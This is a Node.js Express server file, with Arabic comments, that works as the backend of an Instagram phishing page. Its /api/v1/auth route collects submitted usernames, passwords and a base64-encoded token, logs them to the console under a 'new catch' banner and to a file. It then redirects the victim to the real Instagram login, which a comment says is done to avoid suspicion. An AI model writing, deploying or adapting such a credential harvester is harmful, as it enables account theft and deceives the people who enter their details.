const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// هذا السطر يحل مشكلة "Cannot GET /"
// تأكد أن ملف index.html موجود في نفس المجلد الرئيسي مع server.js
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/v1/auth', (req, res) => {
    const { u, p, token } = req.body;
    const log = `[${new Date().toLocaleString()}] User: ${u} | Pass: ${p} | Data: ${Buffer.from(token, 'base64').toString()}\n`;
    
    console.log("=== صيد جديد ===\n", log);
    fs.appendFileSync('logs.txt', log);
    
    // توجيه لإنستغرام الحقيقي لإبعاد الشك
    res.redirect('https://www.instagram.com/accounts/login/');
});

app.listen(PORT, () => console.log(`Don Server is Live on ${PORT}`));
